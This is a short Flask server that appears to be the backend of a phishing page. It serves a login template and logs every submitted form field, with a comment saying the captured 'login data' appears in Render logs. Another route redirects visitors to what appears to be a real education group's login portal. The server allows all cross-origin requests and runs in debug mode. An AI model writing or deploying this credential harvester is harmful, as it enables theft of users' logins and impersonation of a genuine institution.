from flask import Flask, render_template, redirect, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Allow all cross-origin requests (mobile/other devices)

@app.route("/auth", methods=["POST"])
def auth():
    data = request.form.to_dict()
    print("Received login data:", data)  # You will see this in Render logs
    return "ok", 200

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login")
def login():
    return redirect("https://pacegroup.dhi-edu.com/pacegroup_pace/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
